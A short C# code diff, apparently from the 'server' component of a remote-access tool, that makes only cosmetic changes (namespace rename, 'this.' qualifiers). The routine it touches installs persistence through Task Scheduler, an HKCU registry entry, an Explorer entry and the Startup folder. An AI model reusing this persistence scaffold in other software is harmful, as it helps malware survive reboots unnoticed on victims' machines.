@@ -3,7 +3,7 @@ using System.IO;
 using System.Reflection;
 using System.Threading;
 
-namespace bc.srv.Class
+namespace bc.srv.Classes
 {
 
 
@@ -15,7 +15,7 @@ namespace bc.srv.Class
         /// </summary>
         public void StartInstallThread()
         {
-            var t = new Thread(InstallServer)
+            var t = new Thread(this.InstallServer)
             {
                 IsBackground = true
             };
@@ -33,13 +33,13 @@ namespace bc.srv.Class
                 this.InstallTaskScheduler(SrvData.Instance.sAppDataInstall);
             
             if (SrvData.Instance.BUseHkcu)
-                InstallHcku(SrvData.Instance.SHkcuEntry, SrvData.Instance.sAppDataInstall);
+                this.InstallHcku(SrvData.Instance.SHkcuEntry, SrvData.Instance.sAppDataInstall);
             
             if (SrvData.Instance.bUseExplorer)
-                InstallExplorer(SrvData.Instance.sExplorerEntry, SrvData.Instance.sAppDataInstall);
+                this.InstallExplorer(SrvData.Instance.sExplorerEntry, SrvData.Instance.sAppDataInstall);
             
             if (SrvData.Instance.bUseStartupFolder)
-                CopyInStartup(SrvData.Instance.sStartupFileName);
+                this.CopyInStartup(SrvData.Instance.sStartupFileName);
         }
 
         private void InstallTaskScheduler(string appDataPath)
